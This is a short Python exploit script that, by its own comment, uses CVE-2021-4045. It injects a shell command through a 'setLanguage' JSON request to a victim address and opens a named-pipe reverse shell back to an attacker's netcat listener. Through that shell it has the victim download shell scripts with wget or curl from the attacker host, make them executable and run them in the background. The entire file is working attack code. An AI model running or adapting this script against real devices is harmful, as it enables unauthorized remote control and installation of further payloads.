#!/usr/bin/python3
#Using CVE-2021-4045

import requests
import threading
import os
import urllib3
import subprocess
import time
import warnings
import pexpect

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")
''' setting cinfigure '''
attacker = "192.168.50.145"
port_rev = 9999
victim = "192.168.50.118"

def start_netcat():


    nc_command = f"nc -nvlp {port_rev} -s {attacker}"
    nc_process = pexpect.spawn(nc_command)
    time.sleep(1) #等待一下觸發nc連接

    attackers=attacker+":31338"
    cmd = "wget http://"+attackers+"/wget_download_exec.sh"  #test host ip => http://192.168.1.97:31338
    cmd += " || "
    cmd += "curl http://"+attackers+"/curl_download_exec.sh -o curl_download_exec.sh"
    cmd1="chmod +x wget_download_exec.sh || chmod +x curl_download_exec.sh"
    cmd2="(sh ./wget_download_exec.sh || sh ./curl_download_exec.sh) > /dev/null 2>&1 &"

    nc_process.expect(["/ #",pexpect.EOF])
    nc_process.sendline(cmd)  #ls
    nc_process.expect(["/ #",pexpect.EOF])
    
    print(nc_process.before.decode(),end='')
    print(nc_process.after.decode())

    #nc_process.interact() #啟動調適

    nc_process.sendline(cmd1)  #cat /proc/cpuinfo
    nc_process.expect("/ #")  
    print(nc_process.before.decode(),end='')
    print(nc_process.after.decode())
    
    nc_process.sendline(cmd2)  #cat /proc/cpuinfo
    nc_process.expect("/ #")  
    print(nc_process.before.decode(),end='')
    print(nc_process.after.decode())

    nc_process.sendline("exit")
    nc_process.close()

    nc_process.close()
def start_reverse_shell():

    url = "https://" + victim + ":443/"
    reverse_shell = 'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc ' + attacker +" "+ str(port_rev) + ' >/tmp/f'
    json_data = {
        "method": "setLanguage",
        "params": {"payload": "';" + reverse_shell + ";'"}
    }
    requests.post(url, json=json_data, verify=False)

if __name__ == "__main__":
    nc_thread = threading.Thread(target=start_netcat)
    reverse_shell_thread = threading.Thread(target=start_reverse_shell)
    nc_thread.start()
    reverse_shell_thread.start()
    nc_thread.join()
    reverse_shell_thread.join()